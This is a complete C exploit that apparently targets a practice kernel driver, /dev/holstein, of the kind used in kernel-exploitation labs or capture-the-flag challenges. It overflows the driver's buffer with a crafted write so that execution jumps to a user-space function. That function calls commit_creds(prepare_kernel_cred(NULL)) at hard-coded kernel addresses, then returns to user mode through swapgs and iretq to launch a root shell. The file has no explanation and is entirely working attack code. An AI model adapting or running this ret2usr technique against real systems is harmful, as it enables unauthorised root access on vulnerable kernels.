#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define PREPARE_KERNEL_CRED  0xffffffff8105da53
#define COMMIT_CREDS         0xffffffff8105db58

uint64_t user_cs;
uint64_t user_ss;
uint64_t user_rsp;
uint64_t user_rflags;
uint64_t user_rip;

static void win(void)
{
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};

    puts("[+] Got shell!");
    execve("/bin/sh", argv, envp);
    exit(1);
}

static void save_state(void)
{
    user_rip = (uint64_t)win;

    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax prefix;"
    );
}

__attribute__((noreturn))
static void restore_state(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "swapgs;"
        "push user_ss;"
        "push user_rsp;"
        "push user_rflags;"
        "push user_cs;"
        "push user_rip;"
        "iretq;"
        ".att_syntax prefix;"
    );

    __builtin_unreachable();
}

__attribute__((noreturn))
static void get_root(void)
{
    void *(*prepare_kernel_cred)(void *) =
        (void *)PREPARE_KERNEL_CRED;

    int (*commit_creds)(void *) =
        (void *)COMMIT_CREDS;

    commit_creds(prepare_kernel_cred(NULL));
    restore_state();
}

int main(void)
{
    char payload[0x800];

    setbuf(stdout, NULL);
    save_state();

    int fd = open("/dev/holstein", O_RDWR);
    if (fd < 0) {
        perror("open");
        exit(1);
    }

    memset(payload, 'A', sizeof(payload));

    *(uint64_t *)(payload + 0x418) = (uint64_t)get_root;

    printf("ez ret2usr");

    if (write(fd, payload, sizeof(payload)) < 0) {
        perror("write");
        exit(1);
    }

    close(fd);
    return 0;
}